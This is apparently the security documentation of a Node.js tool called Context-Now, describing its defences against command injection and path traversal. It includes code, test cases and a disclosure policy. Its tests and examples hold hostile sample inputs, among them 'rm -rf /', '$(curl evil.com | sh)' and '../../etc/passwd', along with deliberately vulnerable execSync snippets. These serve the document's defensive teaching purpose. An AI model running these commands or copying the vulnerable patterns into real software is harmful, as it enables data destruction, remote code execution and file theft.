# Security Documentation

## 🔒 Security Architecture

Context-Now v3.0 has been built from the ground up with security as the primary concern. This document details our security measures and practices.

## Threat Model

### 1. Command Injection Attacks

**Threat**: Malicious input could execute arbitrary commands
```javascript
// VULNERABLE (v2.0):
execSync(`git checkout -b ${userInput}`);
// If userInput = "; rm -rf /" → Disaster!
```

**Mitigation (v3.0)**:
```javascript
// SECURE:
execFileSync('git', ['checkout', '-b', userInput]);
// Shell metacharacters are treated as literal strings
```

### 2. Path Traversal Attacks

**Threat**: Access files outside project directory
```javascript
// VULNERABLE:
fs.readFileSync(path.join(projectDir, userInput));
// If userInput = "../../etc/passwd" → Leaked secrets!
```

**Mitigation**:
```javascript
// SECURE:
function safePath(userPath, basePath) {
    const resolved = path.resolve(basePath, userPath);
    if (!resolved.startsWith(path.resolve(basePath))) {
        throw new Error('Path traversal detected');
    }
    return resolved;
}
```

### 3. Input Validation Bypass

**Threat**: Unvalidated input could cause unexpected behavior

**Mitigation**:
- Branch names: `/^[a-zA-Z0-9\-_\/\.]+$/`
- Issue titles: Sanitized of shell metacharacters
- Project names: Alphanumeric + dash/underscore only
- All inputs: Maximum length enforced

## Security Controls

### Input Validation

```javascript
// Branch Name Validation
function isValidBranchName(name) {
    const validPattern = /^[a-zA-Z0-9\-_\/\.]+$/;
    return validPattern.test(name) && 
           name.length <= 255 &&
           !name.startsWith('.') &&
           !name.includes('..');
}

// Issue Title Sanitization
function sanitizeIssueTitle(title) {
    return title
        .replace(/[`$(){}[\]|&;<>'"\\]/g, '')  // Remove shell meta
        .replace(/[\x00-\x1F\x7F]/g, '')       // Remove control chars
        .substring(0, 200);                    // Limit length
}
```

### Command Execution

**Never Used**:
- `exec()` - Vulnerable to injection
- `execSync()` - Uses shell
- `spawn()` with `shell: true`

**Always Used**:
- `execFileSync()` - No shell, safe
- Arguments passed as arrays
- Command whitelist enforced

```javascript
// Command Whitelist
const ALLOWED_COMMANDS = ['git', 'gh', 'npm', 'node'];

function safeExec(command, args) {
    if (!ALLOWED_COMMANDS.includes(command)) {
        throw new Error('Command not allowed');
    }
    return execFileSync(command, args, {
        timeout: 30000,      // 30s timeout
        maxBuffer: 10485760  // 10MB max
    });
}
```

### File System Security

```javascript
// Protected Files (cannot be overwritten)
const PROTECTED_FILES = [
    '.git', '.gitignore', 
    'package.json', 'package-lock.json'
];

// Safe Write with Protection
function safeWriteFile(filePath, content, basePath) {
    const safeDest = safePath(filePath, basePath);
    const fileName = path.basename(safeDest);
    
    if (PROTECTED_FILES.includes(fileName)) {
        throw new Error('Cannot overwrite protected file');
    }
    
    fs.writeFileSync(safeDest, content, 'utf8');
}
```

## Security Test Suite

Run security tests:
```bash
npm test
```

Tests verify:
1. ✅ Branch name validation blocks injection
2. ✅ Title sanitization removes dangerous chars
3. ✅ Path traversal attempts are blocked
4. ✅ Schema validation enforces types
5. ✅ Command injection is prevented

### Example Test Cases

```javascript
// Command Injection Test
assert(!isValidBranchName('feature; rm -rf /'));
assert(!isValidBranchName('$(curl evil.com | sh)'));

// Path Traversal Test
assert.throws(() => {
    safePath('../../etc/passwd', '/project');
}, /Path traversal detected/);

// Sanitization Test
assert.strictEqual(
    sanitizeIssueTitle('Bug `rm -rf /` found'),
    'Bug rm -rf / found'  // Backticks removed
);
```

## Secure Coding Guidelines

### DO ✅

```javascript
// Use execFileSync with arrays
execFileSync('git', ['commit', '-m', message]);

// Validate all inputs
if (!isValidBranchName(branch)) {
    throw new Error('Invalid branch name');
}

// Use path validation
const safeDest = safePath(userPath, basePath);
```

### DON'T ❌

```javascript
// Never use execSync
execSync(`git checkout ${branch}`);  // VULNERABLE!

// Never concatenate user input
const cmd = 'git ' + userInput;  // VULNERABLE!

// Never trust paths
fs.readFile(userProvidedPath);  // VULNERABLE!
```

## Vulnerability Disclosure

### Reporting Security Issues

**DO NOT** create public GitHub issues for security vulnerabilities.

**Instead**:
1. Email: security@context-now.dev
2. Include: Description, POC, Impact
3. Response time: Within 48 hours

### Security Update Process

1. Vulnerability reported privately
2. Fix developed in private branch
3. Security test added
4. Release with CVE if applicable
5. Announcement after update available

## Compliance & Standards

### Node.js Security Best Practices

- ✅ No `eval()` usage
- ✅ No dynamic `require()`
- ✅ Dependencies: Zero (no supply chain risk)
- ✅ Strict mode enabled
- ✅ Process limits enforced

### OWASP Top 10 Coverage

| Risk | Mitigation |
|------|------------|
| Injection | execFileSync only |
| Broken Auth | N/A (no auth) |
| Sensitive Data | No logging of secrets |
| XXE | No XML parsing |
| Broken Access | Path validation |
| Security Misconfig | Secure defaults |
| XSS | Input sanitization |
| Insecure Deser | JSON.parse with validation |
| Known Vulns | No dependencies |
| Insufficient Logging | Error messages sanitized |

## Security Checklist for Contributors

Before submitting a PR:

- [ ] No new `execSync` or `exec` calls
- [ ] All user inputs validated
- [ ] Path operations use `safePath()`
- [ ] No sensitive data in logs
- [ ] Security tests pass
- [ ] No new dependencies added
- [ ] Error messages don't leak info

## Version History

### v3.0.0 (Current)
- Complete security rewrite
- All injection vulnerabilities fixed
- Zero dependencies
- Full test coverage

### v2.0.0 (Deprecated)
- Multiple command injection vulnerabilities
- Path traversal possible
- Unsafe shell execution

### v1.0.0 (Deprecated)
- Initial version
- No security considerations

## Security Guarantees

Context-Now v3.0 guarantees:

1. **No Shell Execution**: Commands never touch a shell
2. **Input Validation**: All inputs validated before use
3. **Path Safety**: No access outside project directories
4. **No Dependencies**: Zero supply chain risk
5. **Tested**: Comprehensive security test suite

## Contact

Security Team: security@context-now.dev
GPG Key: [Available on request]

---

Last Updated: 2024
Audited by: GaboCapo Security Team